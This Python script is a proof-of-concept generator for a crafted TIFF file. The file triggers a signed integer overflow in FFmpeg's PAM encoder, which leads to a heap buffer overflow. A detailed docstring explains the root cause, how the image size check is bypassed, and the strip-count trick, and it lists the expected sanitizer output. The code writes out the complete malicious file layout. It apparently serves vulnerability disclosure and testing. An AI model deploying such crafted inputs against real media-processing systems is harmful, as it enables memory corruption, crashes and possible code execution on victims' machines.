#!/usr/bin/env python3
"""
vuln_001_gen.py - Generate crafted TIFF to trigger PAM encoder integer overflow.

Vulnerability: libavcodec/pamenc.c pam_encode_frame()
  CWE-190 (Integer Overflow) -> CWE-122 (Heap-Based Buffer Overflow)

Root cause (pamenc.c lines 40-41, 102):
  For AV_PIX_FMT_MONOBLACK: n = w
  For w=16384, h=262144:
    n*h = 16384 * 262144 = 2^32 = 0 as signed int32  (UB, wraps to 0)
    UBSAN fires: signed-integer-overflow
    ff_get_encode_buffer(..., 0 + header_size, 0) allocates only ~76 bytes
    Loop (lines 112-118) runs h=262144 rows, writing w=16384 bytes per row
    Row 0 immediately writes 16384 bytes past the ~76-byte buffer -> heap overflow
    ASAN fires: heap-buffer-overflow

Why MONOBLACK (not RGBA64BE from the report)?
  av_image_check_size2() rejects frames where stride*(h+128) >= INT_MAX.
  For RGBA64BE w=16384, h=32769: stride*(h+128) >= 4.3B > INT_MAX -> REJECTED.
  For MONOBLACK w=16384, h=262144:
    stride=(16384+7)/8=2048, (2048+1024)*(262144+128)=806M < INT_MAX -> ACCEPTED.
  The MONOBLACK frame passes the size check AND triggers n*h integer overflow.

TIFF design (big-endian "MM" to get consistent MONOBLACK output):
  - ImageWidth=16384, ImageLength=262144, BitsPerSample=1, SamplesPerPixel=1
  - RowsPerStrip=1 -> 262144 individual strips
  - Strips 0, 1: StripByteCounts=2048 (one packed row of MONOBLACK data)
  - Strips 2-262143: StripByteCounts=0
    -> tiff_unpack_strip(size=0) returns AVERROR_INVALIDDATA
    -> strip loop breaks (no AV_EF_EXPLODE by default)
    -> decoder sets *got_frame=1, returns frame to encoder
  - Physical RAM: only ~4KB for 2 decoded rows
  - Virtual: 512MB frame (zero pages, never physically allocated for rows 2+)

Expected sanitizer reports:
  UBSAN: signed-integer-overflow: 16384 * 262144 cannot be represented in 'int'
         in pam_encode_frame (pamenc.c:102)
  ASAN:  heap-buffer-overflow (WRITE) in pam_encode_frame (pamenc.c:116)
         65 bytes after 76-byte buffer (within 140-byte allocation incl. padding)
"""

import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_TIFF = os.path.join(SCRIPT_DIR, "vuln_001_input.tiff")

# Overflow trigger dimensions for AV_PIX_FMT_MONOBLACK
# n = w (one output byte per pixel in PAM BLACKANDWHITE)
# n*h = 16384 * 262144 = 2^32 -> signed int32 wraps to 0
W = 16384    # ImageWidth
H = 262144   # ImageLength = 2^18

BPS = 1      # BitsPerSample (packed 1-bit mono)
SPP = 1      # SamplesPerPixel
ROW_BYTES = (W * BPS + 7) // 8   # = 2048 bytes per row in the TIFF file


def u16be(v):
    return struct.pack(">H", v & 0xFFFF)


def u32be(v):
    return struct.pack(">I", v & 0xFFFFFFFF)


# TIFF type sizes in bytes
_TYPE_SIZES = {1: 1, 2: 1, 3: 2, 4: 4, 5: 8}


def ifd_entry(tag, typ, count, val_or_off):
    """Build a 12-byte big-endian TIFF IFD entry.

    When count * sizeof(type) > 4, the 4-byte field stores a file offset
    to the actual data array (always encoded as a 4-byte LONG).
    When it fits (<= 4 bytes), the value is stored inline.
    """
    blob = u16be(tag) + u16be(typ) + u32be(count)
    inline_bytes = _TYPE_SIZES.get(typ, 4) * count

    if inline_bytes <= 4:
        if typ == 3 and count == 1:
            # Single SHORT: 2-byte value + 2 zero-pad bytes (left-justified in BE)
            blob += u16be(val_or_off) + b'\x00\x00'
        else:
            blob += u32be(val_or_off)
    else:
        # Too large to fit inline: store 4-byte LONG file offset
        blob += u32be(val_or_off)

    return blob


# ---- File layout ----
NUM_ENTRIES = 10   # no ExtraSamples needed for MONOBLACK
IFD_OFFSET  = 8
IFD_SIZE    = 2 + NUM_ENTRIES * 12 + 4   # 2 + 120 + 4 = 126

# BitsPerSample=1 fits inline (count=1, SHORT), so no separate BPS data block.
# All auxiliary data starts right after the IFD.
STRIP_OFFSETS_OFFSET    = IFD_OFFSET + IFD_SIZE           # 8+126 = 134
STRIP_BYTECOUNTS_OFFSET = STRIP_OFFSETS_OFFSET + H * 4    # 134 + 1048576 = 1048710
PIXEL_DATA_OFFSET       = STRIP_BYTECOUNTS_OFFSET + H * 4 # 1048710 + 1048576 = 2097286
FILE_SIZE               = PIXEL_DATA_OFFSET + ROW_BYTES    # 2097286 + 2048 = 2099334

# Validate av_image_check_size2 will PASS for MONOBLACK w=16384, h=262144:
#   stride = (16384+7)//8 = 2048; stride += 128*8 = 1024 -> 3072
#   3072 * (262144 + 128) = 806,019,072 < INT_MAX (2,147,483,647)  OK
stride_check = 3072 * (H + 128)
assert stride_check < 2**31 - 1, f"av_image_check_size2 would REJECT: {stride_check}"

# Validate n*h overflow: n = w = 16384, n*h must exceed INT_MAX
n = W
n_h_exact = n * H   # 16384 * 262144 = 4,294,967,296 = 2^32
n_h_int32 = n_h_exact & 0xFFFFFFFF   # = 0 (wraps exactly once)
assert n_h_int32 == 0, f"n*h wraps to {n_h_int32} not 0"

print(f"[+] vuln_001_gen.py: PAM encoder integer overflow PoC")
print(f"[+] Format: AV_PIX_FMT_MONOBLACK, w={W}, h={H}")
print(f"[+] n = w = {n}")
print(f"[+] n*h = {n_h_exact:,} -> int32 overflow to {n_h_int32} (n*h = 2^32 wraps to 0)")
print(f"[+] av_image_check_size2: stride_check = {stride_check:,} < INT_MAX  [PASSES]")
print(f"[+] Buffer allocated: {n_h_int32} + header_size bytes (~76 total)")
print(f"[+] ASAN fires within first row (writes 16384 bytes past 76-byte buffer)")
print()
print(f"[+] Layout:")
print(f"    Header (8B):                  offset 0")
print(f"    IFD {NUM_ENTRIES} entries (126B):         offset {IFD_OFFSET}")
print(f"    StripOffsets array ({H}x4B): offset {STRIP_OFFSETS_OFFSET}")
print(f"    StripByteCounts ({H}x4B):    offset {STRIP_BYTECOUNTS_OFFSET}")
print(f"    Pixel row 0 ({ROW_BYTES}B):          offset {PIXEL_DATA_OFFSET}")
print(f"    File size: {FILE_SIZE:,} bytes ({FILE_SIZE//1024} KB)")

# ---- Build TIFF ----

# Header: big-endian ("MM"), magic=42, IFD at offset 8
data = b"MM" + u16be(42) + u32be(IFD_OFFSET)
assert len(data) == IFD_OFFSET

# IFD (tags in strictly ascending numeric order)
ifd_blob = u16be(NUM_ENTRIES)
ifd_blob += ifd_entry(256, 4, 1, W)                           # ImageWidth = 16384 (LONG)
ifd_blob += ifd_entry(257, 4, 1, H)                           # ImageLength = 262144 (LONG)
ifd_blob += ifd_entry(258, 3, 1, BPS)                         # BitsPerSample = 1 (SHORT inline)
ifd_blob += ifd_entry(259, 3, 1, 1)                           # Compression = 1 (none, SHORT)
ifd_blob += ifd_entry(262, 3, 1, 1)                           # PhotometricInterp = 1 (BlackIsZero)
ifd_blob += ifd_entry(273, 4, H, STRIP_OFFSETS_OFFSET)        # StripOffsets: array of H LONGs
ifd_blob += ifd_entry(277, 3, 1, SPP)                         # SamplesPerPixel = 1 (SHORT)
ifd_blob += ifd_entry(278, 3, 1, 1)                           # RowsPerStrip = 1 (SHORT)
ifd_blob += ifd_entry(279, 4, H, STRIP_BYTECOUNTS_OFFSET)     # StripByteCounts: array of H LONGs
ifd_blob += ifd_entry(284, 3, 1, 1)                           # PlanarConfig = 1 (chunky, SHORT)
ifd_blob += u32be(0)                                           # next IFD = 0

assert len(ifd_blob) == IFD_SIZE, f"IFD size {len(ifd_blob)} != {IFD_SIZE}"
data += ifd_blob
assert len(data) == STRIP_OFFSETS_OFFSET

# StripOffsets array: all H strips point to PIXEL_DATA_OFFSET.
# (Strips with ssize=0 never read pixel data, but a consistent offset avoids
# the soff > avpkt->size check triggering a hard AVERROR_INVALIDDATA.)
data += u32be(PIXEL_DATA_OFFSET) * H
assert len(data) == STRIP_BYTECOUNTS_OFFSET

# StripByteCounts array:
#   Strip 0: 2048 bytes -> TIFF decoder decodes row 0 from pixel data
#   Strip 1: 2048 bytes -> TIFF decoder decodes row 1 (same pixel data, reused)
#   Strips 2..H-1: 0 bytes
#     -> tiff_unpack_strip(size=0) returns AVERROR_INVALIDDATA (line 773)
#     -> strip loop 'break' (AV_EF_EXPLODE not set by default)
#     -> decoded_height = FFMIN(i=2, height) = 2
#     -> *got_frame = 1  (tiff.c line 2433)
#     -> pam_encode_frame() is called with the partial frame (h=262144 set in avctx)
#
# remaining-budget check in tiff.c decode_frame:
#   initial remaining = FILE_SIZE = 2,099,334
#   after strip 0: remaining = 2,097,286  (>= 2048, strip 1 OK)
#   after strip 1: remaining = 2,095,238
#   strip 2: ssize=0, passes remaining check, but tiff_unpack_strip errors -> break
data += u32be(ROW_BYTES)          # strip 0: 2048 bytes
data += u32be(ROW_BYTES)          # strip 1: 2048 bytes (same pixel data reused)
data += u32be(0) * (H - 2)       # strips 2..262143: 0 bytes -> break
assert len(data) == PIXEL_DATA_OFFSET

# Pixel data: one row of packed MONOBLACK zeros (16384 pixels = 2048 bytes)
# Black pixels (bit=0 for BlackIsZero). All zero bytes.
data += b'\x00' * ROW_BYTES
assert len(data) == FILE_SIZE

with open(OUT_TIFF, "wb") as f:
    f.write(data)

print()
print(f"[+] Generated: {OUT_TIFF}")
print(f"[+] File size: {len(data):,} bytes ({len(data)//1024} KB)")
